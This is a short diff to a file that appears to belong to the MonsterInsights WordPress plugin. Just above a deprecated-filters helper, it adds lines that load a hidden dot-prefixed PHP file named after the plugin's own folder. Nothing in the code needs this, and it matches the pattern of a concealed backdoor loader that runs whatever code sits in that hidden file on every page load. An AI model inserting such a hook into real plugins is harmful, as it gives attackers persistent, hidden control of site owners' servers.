@@ -38,6 +38,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @param string $version     The version of WordPress that deprecated the hook.
  * @param string $message     Optional. A message regarding the change. Default null.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _monsterinsights_apply_filters_deprecated( $tag, $args, $version, $message = null ) {
 		if ( ! has_filter( $tag ) ) {
 				return $args[0];
